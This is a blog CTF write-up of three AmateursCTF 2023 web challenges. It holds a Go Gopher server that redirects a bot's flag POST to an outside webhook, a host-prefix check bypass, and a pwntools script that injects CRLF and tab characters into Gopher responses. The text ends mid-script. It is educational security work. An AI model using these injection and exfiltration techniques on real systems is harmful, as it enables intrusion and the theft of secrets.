<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>AmateursCTF Web Writeup | cjxol.com</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="AmateursCTF Web Writeup" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="AmateursCTF Event on CTFtime" />
<meta property="og:description" content="AmateursCTF Event on CTFtime" />
<link rel="canonical" href="https://www.cjxol.com/posts/amateursctf-web-writeup/" />
<meta property="og:url" content="https://www.cjxol.com/posts/amateursctf-web-writeup/" />
<meta property="og:site_name" content="cjxol.com" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-25T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="AmateursCTF Web Writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-25T00:00:00+01:00","datePublished":"2023-07-25T00:00:00+01:00","description":"AmateursCTF Event on CTFtime","headline":"AmateursCTF Web Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cjxol.com/posts/amateursctf-web-writeup/"},"url":"https://www.cjxol.com/posts/amateursctf-web-writeup/"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cjxol.com/feed.xml" title="cjxol.com" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">cjxol.com</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">AmateursCTF Web Writeup</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2023-07-25T00:00:00+01:00" itemprop="datePublished">Jul 25, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
<a href="https://ctftime.org/event/1983">Event on CTFtime</a></p>

<p>3 web challenge writeups in this post:</p>
<ul>
  <li><a href="#wait-an-eternity">wait-an-eternity</a></li>
  <li><a href="#go-gopher">go-gopher</a></li>
  <li><a href="#gopher-revenge">gopher-revenge</a> (got first blood on this challenge! Not finishing the detailed writeup, but with a summary)</li>
</ul>

<h2 id="wait-an-eternity">wait-an-eternity</h2>

<ul>
  <li>Description:
    <blockquote>
      <p>My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I’ve been waiting a couple days and it’s still asking me to wait. I’m getting a little impatient, could you help me get the flag?</p>
    </blockquote>
  </li>
  <li>Author: voxal</li>
  <li>Entry point: <a href="https://waiting-an-eternity.amt.rs/">waiting-an-eternity.amt.rs</a></li>
</ul>

<h3 id="first-eternity">First eternity</h3>

<p>The webpage just had text “just wait an eternity”. When inspect the request, there is a “Refresh” header with a huge value and url with a secret code.</p>

<p><img src="/assets/image/amateursctf-web-writeup/first-eternity.png" alt="First eternity" /></p>

<h3 id="another-eternity">Another eternity</h3>

<p>Visit the url in the “Refresh” header, it shows a page saying “welcome. please wait another eternity.”.</p>

<p>Inspect the request, it sets a cookie “time” with a value appears to be the current timestamp like <code class="highlighter-rouge">1690326049.1573777</code>. With the cookie set, refresh the page, and the page shows text like “you have not waited an eternity. you have only waited 228.13574051856995 seconds”. The time mentioned in the message appears to be the difference between the current timestamp and the timestamp in the cookie.</p>

<p>Sets the cookie to a large value, it says have only waited a large negative number of seconds. Sets the cookie to a negative value, it says have waited a large number of seconds, but there is still no flag.</p>

<p>The message told to wait an eternity, but how long is an eternity? The internet says the definitions of eternity is “<a href="https://www.dictionary.com/browse/eternity">infinite time</a>”, “<a href="https://dictionary.cambridge.org/dictionary/english/eternity">time that never ends</a>” or “a very long time”. Hmm, how long the website would consider to be an eternity? Look up gunicorn that appears to be the web server according to the response header, the website is running Python. In Python, a number (except <code class="highlighter-rouge">-inf</code>) minus <code class="highlighter-rouge">-inf</code> would be <code class="highlighter-rouge">inf</code>. So, if the cookie value is <code class="highlighter-rouge">-inf</code>, the number of seconds have waited would be <code class="highlighter-rouge">inf</code>, and website would consider it to be an eternity.</p>

<p><img src="/assets/image/amateursctf-web-writeup/another-eternity.png" alt="Another eternity" /></p>

<p>After two eternities, I got the flag:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
</code></pre></div></div>

<h4 id="speculation">Speculation</h4>

<p>The web server is probably taking value from the cookie, and use <code class="highlighter-rouge">float()</code> to convert it to a float, thus <code class="highlighter-rouge">float('-inf')</code> would be float <code class="highlighter-rouge">-inf</code>. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the <a href="https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18">source code</a>)</p>

<h2 id="go-gopher">go-gopher</h2>

<p>This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge <a href="#gopher-revenge">gopher-revenge</a>.</p>

<ul>
  <li>Description:
    <blockquote>
      <p>psst… i know flag sharing isn’t allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.</p>
    </blockquote>
  </li>
  <li>Author: voxal</li>
  <li>Entry point:
    <ul>
      <li>gopher://amt.rs:31290/</li>
      <li><a href="https://gopher-bot.amt.rs/">gopher-bot.amt.rs</a></li>
    </ul>
  </li>
  <li>Downloads:
    <ul>
      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/7c93488d980366dd6255b08e1bb8ac751565508920151011276c964116df5479/bot.go">bot.go</a></li>
      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/b652421619610ac09116d516ac4f659ac95d73402048c96e29cfb2ad183104f7/main.go">main.go</a></li>
    </ul>
  </li>
</ul>

<h3 id="the-challenge">The challenge</h3>

<p>Submit and Visit function for bot</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">Submit</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
	<span class="n">u</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">Host</span><span class="p">,</span> <span class="s">"amt.rs"</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"Invalid url"</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">Visit</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))))</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">Visit</span><span class="p">(</span><span class="n">url</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">res</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gopher</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong: %s"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
	<span class="p">}</span>
	<span class="n">h</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">ToText</span><span class="p">()</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">h</span><span class="p">))</span>
	<span class="n">url</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">CutPrefix</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">Items</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Selector</span><span class="p">,</span> <span class="s">"URL:"</span><span class="p">)</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"Failed to make request"</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="s">"Successful visit"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.</p>

<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomains like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>

<p><img src="/assets/image/amateursctf-web-writeup/go-gopher-flag.png" alt="go-gopher flag" /></p>

<p>Here is my Gopher server code:</p>
<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="s">"log"</span>
        <span class="s">"git.mills.io/prologic/go-gopher"</span>
<span class="p">)</span>
<span class="k">func</span> <span class="n">hello</span><span class="p">(</span><span class="n">w</span> <span class="n">gopher</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">gopher</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"Hello!"</span><span class="p">)</span>
        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"again"</span><span class="p">)</span>
        <span class="n">w</span><span class="o">.</span><span class="n">WriteItem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gopher</span><span class="o">.</span><span class="n">Item</span><span class="p">{</span>
                <span class="n">Selector</span><span class="o">:</span>       <span class="s">"https://webhook.site/[reducted]"</span><span class="p">,</span>
        <span class="p">})</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"hello"</span><span class="p">)</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">gopher</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">hello</span><span class="p">)</span>
        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">gopher</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">"0.0.0.0:31337"</span><span class="p">,</span> <span class="no">nil</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here is the Gopher response:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iHello!         error.host      1
iagain          error.host      1
        https://webhook.site/[reducted]       ::      31337
.
</code></pre></div></div>

<h2 id="gopher-revenge">gopher-revenge</h2>

<p>This writeup is updated on 28 July 2023.</p>

<p>Got first blood on this challenge (this is POG!). The challenge had a total of 19 solves during the CTF.</p>

<ul>
  <li>Description:
    <blockquote>
      <p>you guys are going to regret ever crossing me.</p>
    </blockquote>

    <p>Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:</p>
    <blockquote>
      <p>the flag in “flag.txt” is the exact same flag you need to submit</p>
    </blockquote>
  </li>
  <li>Author: voxal</li>
  <li>Entry point:
    <ul>
      <li>The Gopher endpoint gopher://amt.rs:31290/ for <a href="#go-gopher">go-gopher</a> is still useable to this challenge (implied)</li>
      <li><a href="https://hell.amt.rs">hell.amt.rs</a> (the bot user interface)</li>
    </ul>
  </li>
  <li>Downloads
    <ul>
      <li>The Gopher server code is still the same as for <a href="#go-gopher">go-gopher</a> (implied)</li>
      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/8d307d2b5f9f5c4075fbfe1b7d6ae10c01508306c94ab073d3895900d0052842/bot.go">bot.go</a> updated from <a href="#go-gopher">go-gopher</a></li>
    </ul>
  </li>
</ul>

<h3 id="the-challenge-1">The challenge</h3>

<p>Submit and Visit function of the bot.</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">Submit</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
	<span class="n">u</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="n">u</span><span class="o">.</span><span class="n">Host</span> <span class="o">!=</span> <span class="s">"amt.rs:31290"</span> <span class="p">{</span>
		<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"Invalid url"</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">Visit</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))))</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">Visit</span><span class="p">(</span><span class="n">gopherURL</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">gopherURL</span><span class="p">)</span>
	<span class="n">res</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gopher</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">gopherURL</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong: %s"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
	<span class="p">}</span>
	<span class="n">rawURL</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">CutPrefix</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">Items</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Selector</span><span class="p">,</span> <span class="s">"URL:"</span><span class="p">)</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">rawURL</span><span class="p">)</span>
	<span class="n">u</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">rawURL</span><span class="p">)</span>
	<span class="n">etldpo</span><span class="p">,</span> <span class="n">err2</span> <span class="o">:=</span> <span class="n">publicsuffix</span><span class="o">.</span><span class="n">EffectiveTLDPlusOne</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">Host</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="n">err2</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="n">etldpo</span> <span class="o">!=</span> <span class="s">"amt.rs"</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"Invalid url"</span>
	<span class="p">}</span>
	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">,</span>
		<span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span>
		<span class="s">"username=%s&amp;password=%s"</span><span class="p">,</span> <span class="n">randomString</span><span class="p">(</span><span class="m">20</span><span class="p">),</span> <span class="n">flag</span><span class="p">))))</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"Failed to make request"</span>
	<span class="p">}</span>
	<span class="n">cookies</span> <span class="o">:=</span> <span class="n">resp</span><span class="o">.</span><span class="n">Cookies</span><span class="p">()</span>
	<span class="n">token</span> <span class="o">:=</span> <span class="s">""</span>
	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">cookies</span> <span class="p">{</span>
		<span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">Name</span> <span class="o">==</span> <span class="s">"token"</span> <span class="p">{</span>
			<span class="n">token</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">Value</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="n">token</span> <span class="o">!=</span> <span class="s">""</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Thanks for sending in a flag! Use the following token once i get the gopher-catcher frontend setup: %s"</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="s">"Something went wrong, my sever should have sent a cookie back but it didn't..."</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similar to before as in <a href="#go-gopher">go-gopher</a>, the bot makes Gopher request to an URL we provide, and then makes a HTTP POST request to a URL extracted from the selector of the second item in the Gopher response. The HTTP request contains a random string as “username” and the flag as “password”. The value of the cookie named “token” from the HTTP response will then be shown to us.</p>

<h3 id="take-control-of-the-url-in-the-response">Take control of the URL in the response</h3>

<p>Unlike in <a href="#go-gopher">go-gopher</a> with the cheese to bypass the Gopher URL check, I could not find a way to bypass the check with <code class="highlighter-rouge">u.Host != "amt.rs:31290"</code>. This means I have to provide the Gopher URL to this host.</p>

<h4 id="the-gopher-protocol">The Gopher Protocol</h4>

<p>Reading <a href="https://datatracker.ietf.org/doc/html/rfc1436#section-2">RFC 1436</a> about the Gopher protocol, Gopher is a text-based protocol. The server responses with each item in each line terminated with CR LF, and a period “.” on its own line after the last item. For each line, the first character describes the type of the item, and all character following until a tab is the “user display string”. Each item after ths is also tab-separated. The next field is “selector string”. The next two fields are the domain-name and port for the document or directory described in this line.</p>

<p>In the example requests to the challenge server:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc amt.rs 31290
/submit/lol
iHello lol              error.host      1
iPlease send a post request containing your flag at the server down below.              error.host      1
0Submit here! (gopher doesn't have forms D:)    URL:http://amt.rs/gophers-catcher-not-in-scope  error.host      1
.

</code></pre></div></div>

<p>The client sends the line “magic string” <code class="highlighter-rouge">/submit/</code> for the file/directory. In the response, the first character of each line “i” means the item is for info, 0 means the item is a document (though in this challenge I do not need to care abut the difference). In the 3rd item, the selector is “URL:http://amt.rs/gophers-catcher-not-in-scope”.</p>

<h4 id="the-challenge-gopher-server">The challenge Gopher server</h4>

<p>The interesting function in the Gopher server is <code class="highlighter-rouge">submit</code>, as it appears to point to a “non-exist” flag catcher” (which I confirmed with the CTF organisers that is indeed does not exist). Also the function makes use of the client input.</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">submit</span><span class="p">(</span><span class="n">w</span> <span class="n">gopher</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">gopher</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">name</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Selector</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)[</span><span class="m">2</span><span class="p">]</span>
	<span class="n">undecoded</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">QueryUnescape</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">w</span><span class="o">.</span><span class="n">WriteError</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
	<span class="p">}</span>
	<span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Hello %s"</span><span class="p">,</span> <span class="n">undecoded</span><span class="p">))</span>
	<span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"Please send a post request containing your flag at the server down below."</span><span class="p">)</span>
	<span class="n">w</span><span class="o">.</span><span class="n">WriteItem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gopher</span><span class="o">.</span><span class="n">Item</span><span class="p">{</span>
		<span class="n">Type</span><span class="o">:</span>        <span class="n">gopher</span><span class="o">.</span><span class="n">FILE</span><span class="p">,</span>
		<span class="n">Selector</span><span class="o">:</span>    <span class="s">"URL:http://amt.rs/gophers-catcher-not-in-scope"</span><span class="p">,</span>
		<span class="n">Description</span><span class="o">:</span> <span class="s">"Submit here! (gopher doesn't have forms D:)"</span><span class="p">,</span>
		<span class="n">Host</span><span class="o">:</span>        <span class="s">"error.host"</span><span class="p">,</span>
		<span class="n">Port</span><span class="o">:</span>        <span class="m">1</span><span class="p">,</span>
	<span class="p">})</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">mux</span> <span class="o">:=</span> <span class="n">gopher</span><span class="o">.</span><span class="n">NewServeMux</span><span class="p">()</span>
	<span class="n">mux</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
	<span class="n">mux</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/submit/"</span><span class="p">,</span> <span class="n">submit</span><span class="p">)</span>
	<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">gopher</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">"0.0.0.0:7000"</span><span class="p">,</span> <span class="n">mux</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Noticing the string after the 2nd “/” in the selector or “magic string” in the request is included in the response. The bot takes the 3rd item in the response, and I am able to inject into the 1st line. So it is possible to make the selector in the 3rd item being a URL we want, and push the items after the 1st item in the original response further down.</p>

<h4 id="gopher-url">Gopher URL</h4>

<p><a href="https://datatracker.ietf.org/doc/html/rfc4266">RFC 4266</a> specifies the Gopher URI scheme. I then used the information to build the Gopher URL for the Gopher request.</p>

<p>In the URL example</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gopher://amt.rs:31290/1/submit/lol
</code></pre></div></div>

<p>where <code class="highlighter-rouge">1</code> is the “gophertype”, with <code class="highlighter-rouge">/submit/lol</code> being the “selector string”.</p>

<h3 id="putting-it-together">Putting it together</h3>

<p>Putting it together and generate the payload with the following Python script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'amt.rs'</span><span class="p">,</span> <span class="mi">31290</span><span class="p">)</span>
<span class="n">TAB</span> <span class="o">=</span> <span class="s">'%09'</span>
<span class="n">CRLF</span> <span class="o">=</span> <span class="s">'%0D%0A'</span>
<span class="c1"># url = 'https://cps.amt.rs/register.php'
</span><span class="n">urlencoded_url</span> <span class="o">=</span> <span class="s">'https%3A%2F%2Fcps%2Eamt%2Ers%2Fregister.php'</span>
<span class="n">url_line_content</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'0S</span><span class="si">{</span><span class="n">TAB</span><span class="si">}{</span><span class="n">urlencoded_url</span><span class="si">}{</span><span class="n">TAB</span><span class="si">}</span><span class="s">error.host</span><span class="si">{</span><span class="n">TAB</span><span class="si">}</span><span class="s">1'</span>
<span class="n">s</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'/submit/lol</span><span class="si">{</span><span class="n">TAB</span><span class="si">}{</span><span class="n">TAB</span><span class="si">}</span><span class="s">error.host</span><span class="si">{</span><span class="n">TAB</span><span class="si">}</span><span class="s">1</span><span class="si">{</span><span class="n">CRLF</span><span class="si">}</span><span class="s">iA</span><span class="si">{</span><span class="n">TAB</span><span class="si">}{</span><span class="n">TAB</span><span class="si">}</span><span class="s">error.host</span><span class="si">{</span><span class="n">TAB</span><span class="si">}</span><span class="s">1</span><span class="si">{</span><span class="n">CRLF</span><span class="si">}{</span><span class="n">url_line_content</span><span class="si">}{</span><span class="n">CRLF</span><span class="si">}</span><span class="s">iA'</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[payload] Magic string:'</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[response] Response:'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'%'</span><span class="p">,</span> <span class="s">'%25'</span><span class="p">)</span>
